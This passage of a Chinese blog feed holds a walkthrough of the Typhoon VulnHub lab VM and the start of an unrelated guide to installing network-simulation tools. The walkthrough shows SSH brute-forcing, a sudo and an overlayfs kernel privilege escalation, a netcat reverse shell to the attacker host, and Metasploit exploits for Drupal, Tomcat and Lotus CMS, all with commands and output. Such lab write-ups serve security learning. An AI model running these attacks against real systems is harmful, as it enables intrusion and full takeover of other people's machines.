password foundHydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> finished at 2020-04-16 04:54:31<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过爆破得到了目标主机的<code>SSH</code>用户名跟密码</p><pre class="line-numbers language-bash"><code class="language-bash">host: 10.87.51.15   login: admin   password: metallica<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用获取到的<code>SSH</code>用户名及密码登录到目标主机，发现了内核版本信息</p><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># ssh admin@10.87.51.15</span>    d888888b db    db d8888b. db   db  .d88b.   .d88b.  d8b   db    `~~88~~<span class="token string">' `8b  d8'</span> 88  <span class="token variable"><span class="token variable">`</span>8D 88   88 .8P  Y8. .8P  Y8. 888o  88       88     <span class="token variable">`</span></span>8bd8<span class="token string">'  88oodD'</span> 88ooo88 88    88 88    88 88V8o 88       88       88    88~~~   88~~~88 88    88 88    88 88 V8o88       88       88    88      88   88 `8b  d8<span class="token string">' `8b  d8'</span> 88  V888       YP       YP    88      YP   YP  `Y88P<span class="token string">'   `Y88P'</span>  VP   V8P                 Vulnerable VM By PRISMA CSI - www.prismacsi.comWARNING:  Unauthorized access to this system is forbidden and will beprosecuted by law. By accessing this system, you agree that your actionsmay be monitored <span class="token keyword">if</span> unauthorized usage is suspected.                This is a joke of course :<span class="token punctuation">))</span>                Please hack me<span class="token operator">!</span>-----------------------------------------------------------------------admin@10.87.51.15<span class="token string">'s password:Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64) * Documentation:  https://help.ubuntu.com/  System information as of Thu Apr 16 20:10:15 EEST 2020  System load:  0.16               Users logged in:        0  Usage of /:   19.7% of 17.34GB   IP address for eth0:    10.87.51.15  Memory usage: 27%                IP address for docker0: 172.17.0.1  Swap usage:   0%                 IP address for virbr0:  192.168.122.1  Processes:    427  Graph this data and manage this system at:    https://landscape.canonical.com/New release '</span>16.04.6 LTS<span class="token string">' available.Run '</span>do-release-upgrade' to upgrade to it.Last login: Thu Apr 16 20:10:15 2020 from 10.87.51.8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看sudo版本，发现版本是1.8.9p5，发现sudo命令可用</p><pre class="line-numbers language-bash"><code class="language-bash">admin@typhoon:~$ <span class="token function">sudo</span> -VSudo version 1.8.9p5Sudoers policy plugin version 1.8.9p5Sudoers <span class="token function">file</span> grammar version 43Sudoers I/O plugin version 1.8.9p5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着使用<code>sudo vim</code>测试，发现可以执行，判断SSH用户<code>admin</code>在<code>sudoer</code>列表中，于是尝试使用<code>sudo</code>命令提权</p><pre class="line-numbers language-bash"><code class="language-bash">admin@typhoon:~$ <span class="token function">sudo</span> -u<span class="token comment" spellcheck="true">#-1 /bin/bash</span><span class="token comment" spellcheck="true">#提权成功</span>root@typhoon:~<span class="token comment" spellcheck="true"># cat /root/root-flag</span><span class="token operator">&lt;</span>Congrats<span class="token operator">!</span><span class="token operator">></span>Typhoon_r00t3r<span class="token operator">!</span><span class="token operator">&lt;</span>/Congrats<span class="token operator">!</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于提权成功了，所以很简单的就拿到了flag</p><h3 id="2、通过MongoDB获取flag"><a href="#2、通过MongoDB获取flag" class="headerlink" title="2、通过MongoDB获取flag"></a>2、通过MongoDB获取flag</h3><p>打开在信息收集部分2.3.1记录下的站点<code>http://10.87.51.15/mongoadmin/</code></p><img src="https://s1.ax1x.com/2020/04/16/JAdNWT.png"><p>查看数据库的信息</p><img src="https://s1.ax1x.com/2020/04/16/JAaiEq.png"><p>得到了用户名跟密码</p><img src="https://s1.ax1x.com/2020/04/16/JAak5V.png"><h4 id="2-1、通过sudo命令提权-失败"><a href="#2-1、通过sudo命令提权-失败" class="headerlink" title="2.1、通过sudo命令提权(失败)"></a>2.1、通过sudo命令提权(失败)</h4><p>在看过漏洞利用部分的爆破SSH口令后，可能会觉得在<code>MongoDB</code>中获取的用户也可以采用同样的方式获取权限，其实不然，通过<code>ssh</code>登录上来之后使用<code>sudo vim</code> 命令检测该用户是否在<code>sudoer</code> 列表中，很明显，该用户不在该列表中，所以此方法失败。</p><pre class="line-numbers language-bash"><code class="language-bash">typhoon@typhoon:~$ <span class="token function">sudo</span> vim<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> typhoon:typhoon is not <span class="token keyword">in</span> the sudoers file.  This incident will be reported.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2-2、通过内核提权"><a href="#2-2、通过内核提权" class="headerlink" title="2.2、通过内核提权"></a>2.2、通过内核提权</h4><p>通过<code>SSH</code>登录上来之后，还是要发挥一下这个账号的作用，查看系统内核及发行版本。</p><pre class="line-numbers language-bash"><code class="language-bash">typhoon@typhoon:~$ <span class="token function">uname</span> -aLinux typhoon.local 3.13.0-32-generic <span class="token comment" spellcheck="true">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span>typhoon@typhoon:~$ <span class="token function">cat</span> /etc/issueUbuntu 14.04.1 LTS \n \l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，这个内核版本是非常低的，于是尝试使用 <code>searchsploit</code> 查找漏洞</p><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># searchsploit ubuntu 14.04 | grep "Linux Kernel 3.13.0"</span>Linux Kernel 3.13.0 <span class="token operator">&lt;</span> 3.19 <span class="token punctuation">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="token punctuation">)</span> - <span class="token string">'overlayfs'</span> Local Privilege Escalation                          <span class="token operator">|</span> exploits/linux/local/37292.cLinux Kernel 3.13.0 <span class="token operator">&lt;</span> 3.19 <span class="token punctuation">(</span>Ubuntu 12.04/14.04/14.10/15.04<span class="token punctuation">)</span> - <span class="token string">'overlayfs'</span> Local Privilege Escalation <span class="token punctuation">(</span>Access /etc/shadow<span class="token punctuation">)</span>     <span class="token operator">|</span> exploits/linux/local/37293.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到，在漏洞库中有一条是可用的，使用<code>scp</code>拷贝到当前目录下</p><pre class="line-numbers language-bash"><code class="language-bash">typhoon@typhoon:~$ <span class="token function">scp</span> root@10.87.51.8:/root/37292.c <span class="token keyword">.</span>The authenticity of host <span class="token string">'10.87.51.8 (10.87.51.8)'</span> can<span class="token string">'t be established.ECDSA key fingerprint is 25:6c:de:b2:65:1d:b4:5a:95:b9:41:2e:d3:72:f3:0a.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '</span>10.87.51.8<span class="token string">' (ECDSA) to the list of known hosts.root@10.87.51.8'</span>s password:37292.c                                              100% 5119     5.0KB/s   00:00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里不一定非要使用 <code>scp</code> 命令，也可以搭建一个<code>web</code>站点，这里就不演示了，有方便的当然还是用方便的。</p><p>编译、赋权、运行一条龙服务…</p><pre class="line-numbers language-bash"><code class="language-bash">typhoon@typhoon:~$ gcc 37292.c -o exploittyphoon@typhoon:~$ <span class="token function">chmod</span> 755 exploittyphoon@typhoon:~$ ./exploitspawning threads<span class="token function">mount</span> <span class="token comment" spellcheck="true">#1</span><span class="token function">mount</span> <span class="token comment" spellcheck="true">#2</span>child threads <span class="token keyword">done</span>/etc/ld.so.preload createdcreating shared library<span class="token comment" spellcheck="true"># whoami</span>root<span class="token comment" spellcheck="true"># cat /root/root-flag</span><span class="token operator">&lt;</span>Congrats<span class="token operator">!</span><span class="token operator">></span>Typhoon_r00t3r<span class="token operator">!</span><span class="token operator">&lt;</span>/Congrats<span class="token operator">!</span><span class="token operator">></span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到这获取flag完成。</p><h4 id="2-3、通过可写文件反弹shell"><a href="#2-3、通过可写文件反弹shell" class="headerlink" title="2.3、通过可写文件反弹shell"></a>2.3、通过可写文件反弹shell</h4><p>在查看目录的时候发现根目录下有个<code>tab</code>文件夹。</p><pre class="line-numbers language-bash"><code class="language-bash">typhoon@typhoon:/$ <span class="token function">ls</span>bin   build  etc  initrd.img  lib64  media  opt   root  sbin  sys  tmp  usr  vmlinuzboot  dev    home  lib  lost+found  mnt    proc  run   srv   tab  typhoon  var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>进入后只有一个脚本文件</p><pre class="line-numbers language-bash"><code class="language-bash">typhoon@typhoon:/tab$ <span class="token function">cat</span> script.sh<span class="token keyword">echo</span> <span class="token string">"Typhoon is UP!"</span><span class="token comment" spellcheck="true">#&lt;typh00n!> P0st_3xpl01t3R_flaqGq &lt;typhoon!></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>用低权限用户将构造的命令写入<code>script.sh</code>，令文件调用以root身份运行的<code>/bin/sh</code>，然后<code>反弹shell</code>，从而拿到<code>flag</code></p><pre class="line-numbers language-bash"><code class="language-bash">typhoon@typhoon:/tab$ <span class="token keyword">echo</span> <span class="token string">"mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 10.87.51.8 8888 >/tmp/f"</span> <span class="token operator">></span> script.sh typhoon@typhoon:/tab$ ./script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在服务端监控</p><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nc -lvvp 8888</span>listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 8888 <span class="token punctuation">..</span>.10.87.51.15: inverse host lookup failed: Unknown hostconnect to <span class="token punctuation">[</span>10.87.51.8<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>10.87.51.15<span class="token punctuation">]</span> 37748/bin/sh: 0: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off<span class="token comment" spellcheck="true"># whoami</span>root<span class="token comment" spellcheck="true"># cat /root/root-flag</span><span class="token operator">&lt;</span>Congrats<span class="token operator">!</span><span class="token operator">></span>Typhoon_r00t3r<span class="token operator">!</span><span class="token operator">&lt;</span>/Congrats<span class="token operator">!</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Tips："><a href="#Tips：" class="headerlink" title="Tips："></a>Tips：</h5><p>追加，后来看到有大佬这么找的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> / -type f -perm /o+w 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> grep-Ev<span class="token string">'(proc|sys|www)'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、通过CMS-Drupal获取flag"><a href="#3、通过CMS-Drupal获取flag" class="headerlink" title="3、通过CMS_Drupal获取flag"></a>3、通过CMS_Drupal获取flag</h3><p>这里使用信息收集部分2.3.2中获取到的信息，直接使用<code>MSF</code></p><pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/unix/webapp/drupal_drupalgeddon2msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOST 10.87.51.15RHOST <span class="token operator">=</span><span class="token operator">></span> 10.87.51.15msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> TARGETURI /drupalTARGETURI <span class="token operator">=</span><span class="token operator">></span> /drupalmsf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面的提权过程可以使用2.3部分，也可以使用5部分，这就不多写一遍了。</p><h3 id="4、通过Tomcat获取flag"><a href="#4、通过Tomcat获取flag" class="headerlink" title="4、通过Tomcat获取flag"></a>4、通过Tomcat获取flag</h3><p>使用<code>msf</code>来获取密码</p><pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use auxiliary/scanner/http/tomcat_mgr_loginmsf5 auxiliary<span class="token punctuation">(</span>scanner/http/tomcat_mgr_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOST 10.87.51.15RHOST <span class="token operator">=</span><span class="token operator">></span> 10.87.51.15msf5 auxiliary<span class="token punctuation">(</span>scanner/http/tomcat_mgr_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RPORT 8080RPORT <span class="token operator">=</span><span class="token operator">></span> 8080msf5 auxiliary<span class="token punctuation">(</span>scanner/http/tomcat_mgr_login<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.87.51.15:8080 - Login Successful: tomcat:tomcat<span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: both:admin <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: both:manager <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: both:role1 <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: both:root <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: both:tomcat <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: both:s3cret <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: both:vagrant <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: j2deployer:j2deployer <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: cxsdk:kdsxc <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: root:owaspbwa <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: ADMIN:ADMIN <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: xampp:xampp <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: QCC:QLogic66 <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>-<span class="token punctuation">]</span> 10.87.51.15:8080 - LOGIN FAILED: admin:vagrant <span class="token punctuation">(</span>Incorrect<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Scanned 1 of 1 hosts <span class="token punctuation">(</span>100% complete<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里获取到了<code>Tomcat</code>的账号为：<code>tomcat</code>，密码也是<code>tomcat</code>，接下来使用<code>MSF</code>来获取权限。</p><pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/http/tomcat_mgr_uploadmsf5 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOST 10.87.51.15RHOST <span class="token operator">=</span><span class="token operator">></span> 10.87.51.15msf5 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RPORT 8080RPORT <span class="token operator">=</span><span class="token operator">></span> 8080msf5 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> HTTPUSERNAME tomcatHTTPUSERNAME <span class="token operator">=</span><span class="token operator">></span> tomcatmsf5 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> HTTPPASSWORD tomcatHTTPPASSWORD <span class="token operator">=</span><span class="token operator">></span> tomcatmsf5 exploit<span class="token punctuation">(</span>multi/http/tomcat_mgr_upload<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 10.87.51.8:4444<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Retrieving session ID and CSRF token<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading and deploying xh23FUE7t<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing xh23FUE7t<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Undeploying xh23FUE7t <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>53906 bytes<span class="token punctuation">)</span> to 10.87.51.15<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 2 opened <span class="token punctuation">(</span>10.87.51.8:4444 -<span class="token operator">></span> 10.87.51.15:49961<span class="token punctuation">)</span> at 2020-04-16 09:28:28 -0400meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面的提权过程可以使用2.3部分，也可以使用5部分，这就不多写一遍了。</p><h3 id="5、通过CMS-Lotus获取flag"><a href="#5、通过CMS-Lotus获取flag" class="headerlink" title="5、通过CMS_Lotus获取flag"></a>5、通过CMS_Lotus获取flag</h3><p>这里先用<code>Metasploit</code>拿到一个<code>/var/www</code> 的权限</p><pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/http/lcms_php_execmsf5 exploit<span class="token punctuation">(</span>multi/http/lcms_php_exec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOST 10.87.51.15RHOST <span class="token operator">=</span><span class="token operator">></span> 10.87.51.15msf5 exploit<span class="token punctuation">(</span>multi/http/lcms_php_exec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> URI /cms/URI <span class="token operator">=</span><span class="token operator">></span> /cms/msf5 exploit<span class="token punctuation">(</span>multi/http/lcms_php_exec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LHOST 10.87.51.8LHOST <span class="token operator">=</span><span class="token operator">></span> 10.87.51.8msf5 exploit<span class="token punctuation">(</span>multi/http/lcms_php_exec<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LPORT 4444LPORT <span class="token operator">=</span><span class="token operator">></span> 4444msf5 exploit<span class="token punctuation">(</span>multi/http/lcms_php_exec<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 10.87.51.8:4444<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using found page param: /cms/index.php?page<span class="token operator">=</span>index<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending exploit <span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>38288 bytes<span class="token punctuation">)</span> to 10.87.51.15<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>10.87.51.8:4444 -<span class="token operator">></span> 10.87.51.15:49909<span class="token punctuation">)</span> at 2020-04-16 08:46:46 -0400meterpreter <span class="token operator">></span> <span class="token function">pwd</span>/var/www/html/cms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再通过上传内核提权脚本提权。</p><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> shellProcess 3396 created.Channel 2 created.<span class="token function">cd</span> /tmp<span class="token function">wget</span> http://10.87.51.8/37292.c--2020-04-17 00:04:50--  http://10.87.51.8/37292.cConnecting to 10.87.51.8:80<span class="token punctuation">..</span>. connected.HTTP request sent, awaiting response<span class="token punctuation">..</span>. 200 OKLength: 5119 <span class="token punctuation">(</span>5.0K<span class="token punctuation">)</span> <span class="token punctuation">[</span>text/x-csrc<span class="token punctuation">]</span>Saving to: <span class="token string">'37292.c'</span>     0K <span class="token punctuation">..</span><span class="token punctuation">..</span>                                                  100%  652M<span class="token operator">=</span>0s2020-04-17 00:04:50 <span class="token punctuation">(</span>652 MB/s<span class="token punctuation">)</span> - <span class="token string">'37292.c'</span> saved <span class="token punctuation">[</span>5119/5119<span class="token punctuation">]</span>gcc 37292.c -o exp./expspawning threads<span class="token function">mount</span> <span class="token comment" spellcheck="true">#1</span><span class="token function">mount</span> <span class="token comment" spellcheck="true">#2</span>child threads <span class="token keyword">done</span>/etc/ld.so.preload createdcreating shared librarysh: 0: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off<span class="token comment" spellcheck="true"># cat /root/root-flag</span><span class="token operator">&lt;</span>Congrats<span class="token operator">!</span><span class="token operator">></span>Typhoon_r00t3r<span class="token operator">!</span><span class="token operator">&lt;</span>/Congrats<span class="token operator">!</span><span class="token operator">></span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用到这，不得不说，有的时候一种方式用不了就应该灵活变通，上面的案例用了<code>scp</code>，到这就需要用到<code>wget</code>，所以灵活变通很重要，另外这个靶场感觉还有很多漏洞没有挖掘到，而且我实在是太菜了，以后技术有长进了再来搞。</p><h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><pre class="line-numbers language-bash"><code class="language-bash">https://xz.aliyun.com/t/3643https://medium.com/@tusharroutray/typhoon-1-02-a-vulnhub-vm-walkthrough-8ebd86cc3f74https://hackso.me/typhoon-1.02-walkthrough/https://www.hackingarticles.in/typhoon-1-02-vulnhub-walkthrough/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Penetration_Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration_Test </tag>
            
            <tag> Metasploit </tag>
            
            <tag> Typhoon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下数通环境搭建</title>
      <link href="/2020/04/14/windows-xia-shu-tong-huan-jing-da-jian/"/>
      <url>/2020/04/14/windows-xia-shu-tong-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows下数通环境搭建"><a href="#Windows下数通环境搭建" class="headerlink" title="Windows下数通环境搭建"></a>Windows下数通环境搭建</h1><h2 id="一、博客简介及预备软件"><a href="#一、博客简介及预备软件" class="headerlink" title="一、博客简介及预备软件"></a>一、博客简介及预备软件</h2><p>​        计算机网络技术的小伙伴们会用到H3C、eNSP、Cisco Packet Tracer、VirtualBox、Wireshark、WinPcap等数通类软件，但是也有很多小伙伴因为各个版本的问题导致环境搭不好，所以在这写一篇博客记录一下全环境的搭建。本文环境全部基于虚拟机搭建（因为我内存大？CPU强？），因为我真机已经都装了，不想重新搞，啊哈哈哈哈，总而言之，这是篇水文。</p><p>​        预备软件及版本如下：</p><ul><li>eNSP（1.3.00.100 V100R003C00SPC100）</li><li>HCL（HCL2.1.0）</li><li>Wireshark（3.0.3）</li><li>VirtualBox（5.1.28）</li><li>WinPcap（4.1.3）</li><li>Secure CRT（8.5）</li></ul><h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>​        本次环境搭建顺序如下：Wireshark—&gt;WinPcap—&gt;VirtualBox—&gt;eNSP—&gt;HCL，下面开始环境搭建。</p><h3 id="1、安装Wireshark"><a href="#1、安装Wireshark" class="headerlink" title="1、安装Wireshark"></a>1、安装Wireshark</h3><img src="https://s1.ax1x.com/2020/04/14/JS7W0U.png"><img src="https://s1.ax1x.com/2020/04/14/JS7c60.png"><img src="https://s1.ax1x.com/2020/04/14/JS7gXV.png"><img src="https://s1.ax1x.com/2020/04/14/JS76lq.png"><p>​        安装的位置可以自定义</p><img src="https://s1.ax1x.com/2020/04/14/JS7ypn.png"><p>​        这里建议安装Npcap 0.995</p><img src="https://s1.ax1x.com/2020/04/14/JS7RmT.png"><p>​        这里建议安装USPPcap1.3.00，如果实在是不想装可以不装，装了方便抓取USB的包。</p><img src="https://s1.ax1x.com/2020/04/14/JS7f7F.png"><img src="https://s1.ax1x.com/2020/04/14/JS7Ih9.png"><img src="https://s1.ax1x.com/2020/04/14/JS75tJ.png"><img src="https://s1.ax1x.com/2020/04/14/JS7O0O.png"><img src="https://s1.ax1x.com/2020/04/14/JS74k4.png"><img src="https://s1.ax1x.com/2020/04/14/JS7TpR.png"><img src="https://s1.ax1x.com/2020/04/14/JS7H6x.png"><img src="https://s1.ax1x.com/2020/04/14/JS7bX6.png"><p>​        安装完成后立刻重启。</p><h3 id="2、安装WinPcap"><a href="#2、安装WinPcap" class="headerlink" title="2、安装WinPcap"></a>2、安装WinPcap</h3><img src="https://s1.ax1x.com/2020/04/14/JS7711.png"><img src="https://s1.ax1x.com/2020/04/14/JS7LnK.png"><img src="https://s1.ax1x.com/2020/04/14/JS7X7D.png"><p>​        这个全都按照图示的来就好了，基本上都是默认。</p><h3 id="3、安装VirtualBox"><a href="#3、安装VirtualBox" class="headerlink" title="3、安装VirtualBox"></a>3、安装VirtualBox</h3><img src="https://s1.ax1x.com/2020/04/14/JS7zhd.png"><p>​        老规矩，安装位置可以自定义。</p><img src="https://s1.ax1x.com/2020/04/14/JS7vAe.png"><img src="https://s1.ax1x.com/2020/04/14/JS7xtH.png"><img src="https://s1.ax1x.com/2020/04/14/JSHehj.png"><img src="https://s1.ax1x.com/2020/04/14/JSHp9A.png"><p>​        下面弹出来的全都安装，不安装的话，你也知道什么结果…</p><img src="https://s1.ax1x.com/2020/04/14/JSHCct.png"><p>​        安装完成后无需启动检测。</p><img src="https://s1.ax1x.com/2020/04/14/JSXeld.png"><p>​        这里记得安装完成后不要打开VirtulBox，继续往下走。</p><h3 id="4、安装eNSP"><a href="#4、安装eNSP" class="headerlink" title="4、安装eNSP"></a>4、安装eNSP</h3><img src="https://s1.ax1x.com/2020/04/14/JSH91I.png"><img src="https://s1.ax1x.com/2020/04/14/JSHPjP.png"><img src="https://s1.ax1x.com/2020/04/14/JSHFnf.png"><img src="https://s1.ax1x.com/2020/04/14/JSHkB8.png"><img src="https://s1.ax1x.com/2020/04/14/JSHAHS.png"><img src="https://s1.ax1x.com/2020/04/14/JSHZNQ.png"><img 